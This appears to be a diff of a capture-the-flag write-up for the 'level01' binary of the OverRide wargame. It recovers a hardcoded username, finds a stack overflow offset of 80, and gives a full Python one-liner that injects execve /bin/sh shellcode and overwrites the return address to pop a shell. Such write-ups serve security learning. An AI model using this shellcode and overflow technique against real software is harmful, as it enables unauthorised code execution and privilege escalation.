@@ -5,18 +5,7 @@ Enter Username:
 Okk let's search for it in the code
 In the code we cant see any call to a shell or a print of the pass, we will need to use shelcode !
 
-(gdb) b *0x804848b
-Breakpoint 1 at 0x804848b
-(gdb) r
-Starting program: /home/users/level01/level01 
-********* ADMIN LOGIN PROMPT *********
-Enter Username: q
-verifying username....
-
-
-Breakpoint 1, 0x0804848b in verify_user_name ()
-(gdb) x /s 0x80486a8
-0x80486a8:	 "dat_wil"
+RTFC # pbVar3 = (byte *)"dat_wil";  ---> the code do a cmp like function that stop if username is found
 
 We got the username, it seems that the program only check 7 char that may be usefull
 
@@ -37,15 +26,14 @@ Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
 
 Bingo we have an offset of 80
-
+ 
 We got a plan, we have a lot of spare place in the first input so we will put our shellcode inside
 then for the second input add padding * 80 + address of the first buffer + 7 (7 is the size of the username), that should do the trick
 
  8048521:	c7 04 24 40 a0 04 08 	movl   $0x804a040,(%esp) --> 0x0804a040 is our first buffer address
 
-level01@OverRide:~$ (python -c 'print("dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08")') > /tmp/payload
+level01@OverRide:~$ (python -c 'print("dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08")'; cat) | ./level01
 
-level01@OverRide:~$ cat /tmp/payload - | ./level01 
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
